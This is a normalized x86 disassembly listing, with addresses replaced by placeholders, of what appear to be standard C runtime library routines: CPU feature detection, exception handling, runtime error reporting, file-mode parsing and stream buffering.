jne r-xdata
and eax 0x80000000
je r-xdata
test eax 0x7ff00000
jne r-xdata
fsqrt
cmp [ esp ] 0x27f
je r-xdata
mov edx 0x5
lea ecx [ rw-data ]
call sub_428027
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
fstp st0
fld [ r--data ]
mov eax 0x1
test eax 0xfffff
jne r-xdata
mov edx 0x5
lea ecx [ rw-data ]
jmp r-xdata
pop edx
retn
fldcw [ esp ]
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
jmp r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_428027
pop edx
retn
sub_41ea9a
push ebp
mov ebp esp
and [ rw-data ] 0x0
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
or [ rw-data ] ebx
push 0xa
call IsProcessorFeaturePresent
test eax eax
je r-xdata
xor eax eax
pop ebx
leave
retn
xor ecx ecx
mov eax ebx
mov [ rw-data ] ebx
cpuid
push esi
mov esi [ rw-data ]
push edi
lea edi [ ebp - 0x10 ]
or esi 0x2
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
test [ ebp - 0x8 ] 0x100000
mov [ rw-data ] esi
je r-xdata
test [ ebp - 0x8 ] 0x10000000
je r-xdata
or esi 0x4
mov [ rw-data ] 0x2
mov [ rw-data ] esi
push 0x7
xor ecx ecx
pop eax
cpuid
lea esi [ ebp - 0x10 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
test [ ebp - 0xc ] 0x200
mov esi [ rw-data ]
je r-xdata
or esi 0x8
mov [ rw-data ] 0x3
mov [ rw-data ] esi
xor eax eax
xor ecx ecx
cpuid
lea edi [ ebp - 0x10 ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
cmp [ ebp - 0xc ] 0x756e6547
jne r-xdata
or esi 0x2
mov [ rw-data ] esi
pop edi
pop esi
cmp [ ebp - 0x4 ] 0x49656e69
jne r-xdata
cmp [ ebp - 0x8 ] 0x6c65746e
jne r-xdata
xor eax eax
inc eax
xor ecx ecx
cpuid
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov eax [ ebp - 0x10 ]
and eax 0xfff3ff0
cmp eax 0x106c0
je r-xdata
or esi 0x1
mov [ rw-data ] esi
cmp eax 0x20660
je r-xdata
cmp eax 0x20670
je r-xdata
cmp eax 0x30650
je r-xdata
cmp eax 0x30660
je r-xdata
cmp eax 0x30670
jne r-xdata
sub_41ebd3
push 0xc
push r--data
call sub_41ecb0
push 0xe
call sub_41ad36
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41ec3b
call sub_41ecf5
retn
mov ecx [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_417912
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ ecx ] eax
jne r-xdata
mov edx ecx
jmp r-xdata
mov eax [ ecx + 0x4 ]
mov [ edx + 0x4 ] eax
push ecx
call sub_417912
pop ecx
mov [ ebp - 0x1c ] ecx
test ecx ecx
je r-xdata
sub_41ec44
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_41ec77
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
pop ebp
retn
sub_41ecb0
push sub_41ed10
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_41ed10
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebx + 0x8 ]
xor edi [ rw-data ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
mov eax [ edi ]
lea esi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_4170bc
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_4170bc
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebx - 0x4 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x8 ] eax
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push esi
mov ecx ebx
mov edx 0xfffffffe
call sub_41f93b
lea eax [ eax + eax * 2 ]
lea eax [ eax + 0x4 ]
mov ecx [ edi + eax * 4 + 0x4 ]
mov ebx [ edi + eax * 4 ]
lea eax [ edi + eax * 4 ]
mov [ ebp - 0x10 ] eax
test ecx ecx
je r-xdata
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x8 ]
add ecx esi
xor ecx [ edx + esi ]
call sub_4170bc
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_4170bc
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_41f8f2
mov cl 0x1
mov [ ebp - 0x1 ] cl
test eax eax
js r-xdata
test cl cl
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jle r-xdata
jmp r-xdata
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
mov eax ebx
mov [ ebp - 0x8 ] ebx
cmp ebx 0xfffffffe
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_41f922
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
cmp [ eax + 0xc ] edx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push esi
mov ecx eax
call sub_41f93b
mov eax [ ebp + 0xc ]
push r--data
call sub_423220
add esp 0x4
test eax eax
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_4170bc
mov ecx [ ebp - 0x10 ]
mov edx esi
mov ecx [ ecx + 0x8 ]
call sub_41f909
int3
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call [ r--data ]
add esp 0x8
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_4170bc
sub_41eea5
push 0x3
call sub_4260b6
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_41ef02
push 0xff
call sub_41ef02
pop ecx
pop ecx
push 0x3
call sub_4260b6
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_41eede
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x17
jb r-xdata
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_41ef02
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_41eede
mov edi eax
pop ecx
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4170bc
leave
retn
push ebx
push 0x3
call sub_4260b6
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x3
call sub_4260b6
pop ecx
test eax eax
jne r-xdata
pop ebx
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor ebx ebx
mov ecx ebx
push r--data
push 0x314
push rw-data
call sub_417a48
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_41a7f0
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc ecx
cmp ecx 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41f421
int3
push 0x104
push rw-data
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov esi 0x2fb
test eax eax
jne r-xdata
mov al [ edi + ecx * 2 ]
mov [ ebp + ecx - 0x1f8 ] al
cmp [ edi + ecx * 2 ] bx
je r-xdata
push rw-data
call sub_41cd45
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push esi
push rw-data
call sub_417a48
add esp 0xc
test eax eax
jne r-xdata
push r--data
push 0x314
mov esi rw-data
push esi
call sub_4179dc
add esp 0xc
test eax eax
jne r-xdata
push rw-data
call sub_41cd45
lea ecx [ eax * 2 + rw-data ]
mov eax ecx
sub eax rw-data
push 0x3
sar eax 0x1
push r--data
sub esi eax
push esi
push ecx
call sub_419c88
add esp 0x14
test eax eax
jne r-xdata
push edi
push 0x314
push esi
call sub_4179dc
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push esi
call sub_4281fc
add esp 0xc
jmp r-xdata
sub_41f0bd
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x94 ] edx
mov [ ebp - 0x8c ] ecx
cmp eax 0x1
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x80
lea ebx [ ebp - 0x84 ]
mov eax ebx
push eax
push [ ebp + 0x14 ]
xor esi esi
push ecx
push edx
mov [ ebp - 0x90 ] esi
call sub_4284b6
add esp 0x14
mov [ ebp - 0x88 ] eax
test eax eax
jne r-xdata
test eax eax
jne r-xdata
xor esi esi
push esi
push esi
push [ ebp + 0x14 ]
mov [ edi ] esi
push ecx
call sub_41e86a
mov ebx eax
add esp 0x10
test ebx ebx
je r-xdata
push 0x1
push eax
call sub_41b887
mov edx eax
pop ecx
pop ecx
mov [ edi ] edx
test edx edx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
or eax 0xffffffff
and [ ebp - 0x88 ] eax
push 0x2
lea eax [ ebp - 0x88 ]
push eax
mov eax [ ebp + 0x14 ]
or eax 0x20000000
push eax
push ecx
call sub_41e86a
add esp 0x10
test eax eax
je r-xdata
push [ edi ]
call sub_417912
pop ecx
mov [ edi ] esi
jmp r-xdata
push 0x2
push ebx
call sub_41b887
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x88 ]
lea eax [ ecx - 0x1 ]
push eax
push ebx
push ecx
push edx
call sub_419be4
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp - 0x90 ] esi
je r-xdata
push esi
push esi
push [ ebp + 0x14 ]
push [ ebp - 0x8c ]
push [ ebp - 0x94 ]
call sub_4284b6
add esp 0x14
mov [ ebp - 0x88 ] eax
test eax eax
je r-xdata
mov al [ ebp - 0x88 ]
mov [ edi ] al
jmp r-xdata
push ebx
push eax
push [ ebp + 0x14 ]
push [ ebp - 0x8c ]
call sub_41e86a
add esp 0x10
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_41f421
int3
cmp [ ebp - 0x90 ] esi
je r-xdata
push ebx
call sub_417912
pop ecx
push 0x1
push eax
call sub_41b887
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call sub_417912
pop ecx
push [ ebp - 0x88 ]
mov [ ebp - 0x90 ] 0x1
push ebx
push [ ebp + 0x14 ]
push [ ebp - 0x8c ]
push [ ebp - 0x94 ]
call sub_4284b6
add esp 0x14
mov [ ebp - 0x88 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
sub_41f2b6
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0xffffffff
push edi
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_41cae0
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x218 ] eax
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov eax [ eax - 0x4 ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x320 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x31c ] eax
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
mov edi eax
lea eax [ ebp - 0x328 ]
push eax
call sub_41ca66
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_425bdc
pop ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_4170bc
leave
retn
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
call sub_425bdc
pop ecx
sub_41f3e6
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41f421
int3
pop ebp
jmp eax
sub_41f421
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_41f2b6
push esi
call sub_41ca51
add esp 0x10
pop esi
retn
push 0x5
pop ecx
int 0x29
sub_41f44c
push 0x10
push r--data
call sub_41ecb0
xor ebx ebx
mov esi ebx
mov [ ebp - 0x1c ] esi
push 0x1
call sub_41ad36
pop ecx
mov [ ebp - 0x4 ] ebx
mov edi ebx
test esi esi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41f55b
mov eax esi
call sub_41ecf5
retn
and [ esi + 0xc ] 0x8000
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi ] ebx
mov [ esi + 0x1c ] ebx
or [ esi + 0x10 ] 0xffffffff
push 0x38
call sub_41b8d1
pop ecx
mov ecx eax
mov eax [ rw-data ]
mov [ eax + edi * 4 ] ecx
test ecx ecx
je r-xdata
test [ eax + 0xc ] 0x83
jne r-xdata
push 0xfa0
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
add eax 0x20
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov esi [ eax + edi * 4 ]
mov [ ebp - 0x1c ] esi
mov [ esi + 0xc ] ebx
inc edi
jmp r-xdata
test [ eax + 0xc ] 0x8000
jne r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
lea eax [ edi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + edi * 4 ]
push edi
call sub_4192c7
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ edi + 0x10 ]
push eax
call sub_41adbe
pop ecx
test eax eax
je r-xdata
mov esi eax
mov [ ebp - 0x1c ] esi
jmp r-xdata
push eax
push edi
call sub_419331
pop ecx
pop ecx
sub_41f564
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ rw-data ]
xor ecx ecx
push 0x20
mov edx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
pop eax
jmp r-xdata
cmp [ esi ] ax
je r-xdata
add esi 0x2
movzx eax [ esi ]
cmp eax 0x61
je r-xdata
mov ebx 0x109
cmp eax 0x72
je r-xdata
push 0x20
pop eax
jmp r-xdata
mov [ ebp + 0xc ] 0x1000
mov ebx ecx
or edi 0x1
jmp r-xdata
cmp eax 0x77
je r-xdata
cmp [ esi ] ax
je r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
movzx eax ax
cmp eax 0x53
jg r-xdata
add esi 0x2
xor ecx ecx
movzx eax [ esi ]
inc ecx
test ax ax
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
add esi 0x2
xor eax eax
cmp [ esi ] ax
jne r-xdata
push 0x20
pop eax
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or edi 0x2
pop edi
pop esi
pop ebx
leave
retn
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_428d97
add esp 0x14
test eax eax
jne r-xdata
cmp [ esi ] ax
je r-xdata
mov eax [ ebp + 0xc ]
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
xor eax eax
jmp r-xdata
inc [ rw-data ]
mov eax [ ebp + 0x14 ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x1c ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] ecx
add esi 0x2
push 0x3
push esi
push r--data
call sub_428db5
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
or ebx 0x20
jmp r-xdata
add esi 0x2
movzx eax [ esi ]
test ax ax
jne r-xdata
sub eax 0xb
je r-xdata
push 0x20
add esi 0x6
pop eax
jmp r-xdata
test ecx ecx
je r-xdata
or ebx 0x8000
jmp r-xdata
test edx edx
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] ax
je r-xdata
inc edx
or edi 0x4000
jmp r-xdata
test edx edx
jne r-xdata
sub eax 0x6
jne r-xdata
and ebx 0xfffffffe
and edi 0xfffffffc
or ebx 0x2
or edi 0x80
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
add esi 0x2
cmp [ esi ] 0x3d
jne r-xdata
inc edx
and edi 0xffffbfff
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
add esi 0x2
cmp [ esi ] ax
je r-xdata
or ebx 0x4000
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_428deb
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] eax
jne r-xdata
push 0x8
push r--data
push esi
call sub_428deb
add esp 0xc
test eax eax
jne r-xdata
add esi 0xa
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_428deb
add esp 0xc
test eax eax
jne r-xdata
add esi 0x10
or ebx 0x20000
jmp r-xdata
add esi 0xe
or ebx 0x10000
sub_41f800
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_41f890
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_4290b5
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_4290d4
jmp r-xdata
sub_41f890
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_4170bc
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_41f800
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_41f8f2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_41f922
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41f952
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
push esi
call sub_42094c
pop ecx
mov ecx [ esi + 0xc ]
mov edi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_41ccf1
mov [ eax ] 0x9
push ebx
xor ebx ebx
test cl 0x1
je r-xdata
call sub_41ccf1
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test cl 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
je r-xdata
call sub_419282
add eax 0x20
cmp esi eax
je r-xdata
or ecx 0x20
mov [ esi + 0xc ] ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
and ecx 0xfffffffe
mov [ esi ] eax
mov [ esi + 0xc ] ecx
xor eax eax
inc eax
push eax
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0x8 ]
push eax
push edi
call sub_421207
add esp 0xc
mov ebx eax
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
lea eax [ edx + 0x1 ]
mov [ esi ] eax
mov eax [ esi + 0x18 ]
sub ecx edx
dec eax
mov [ ebp + 0xc ] ecx
mov [ esi + 0x4 ] eax
test ecx ecx
jle r-xdata
push edi
call sub_4290d7
pop ecx
test eax eax
jne r-xdata
call sub_419282
add eax 0x40
cmp esi eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
movzx eax [ ebp + 0x8 ]
or [ esi + 0xc ] 0x20
cmp edi 0xffffffff
je r-xdata
push ecx
push edx
push edi
call sub_421207
add esp 0xc
mov ebx eax
jmp r-xdata
push esi
call sub_423d3f
pop ecx
pop ebx
mov ecx rw-data
cmp edi 0xfffffffe
je r-xdata
mov ecx [ esi + 0x8 ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
jmp r-xdata
push 0x2
push ebx
push ebx
push edi
call sub_421c67
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov ecx edi
mov eax edi
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
cmp ebx [ ebp + 0xc ]
je r-xdata
test [ ecx + 0x4 ] 0x20
je r-xdata
sub_41fa9f
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
[ edi ]
cmp [ ebp + 0x14 ] eax
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
test edi edi
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp edi 0x3fffffff
jbe r-xdata
test esi esi
jne r-xdata
pop edi
leave
retn
lea eax [ edi + edi ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
jmp r-xdata
pop ebx
test ebx ebx
js r-xdata
push ebx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov ebx eax
test esi esi
je r-xdata
pop esi
xor eax eax
cmp [ ebp - 0x1c ] eax
mov [ esi + edi * 2 - 0x2 ] ax
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_41f952
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_41f952
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov eax ebx
jmp r-xdata
sub_41fb98
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
pop ebp
retn
call sub_41ccf1
mov [ eax ] 0x16
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_42912b
call sub_41fa9f
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
xor ecx ecx
mov [ esi ] cx
pop esi
pop ebp
retn
call sub_41ccf1
mov [ eax ] 0x22
jmp r-xdata
call sub_41f411
or eax 0xffffffff
sub_41fc0f
push ebp
mov ebp esp
sub esp 0x488
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov [ ebp - 0x428 ] eax
xor eax eax
mov ebx eax
lea ecx [ ebp - 0x450 ]
mov [ ebp - 0x408 ] esi
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x440 ] eax
mov [ ebp - 0x430 ] eax
call sub_4199d2
call sub_41ccf1
mov [ ebp - 0x464 ] eax
cmp [ ebp - 0x428 ] ebx
jne r-xdata
test esi esi
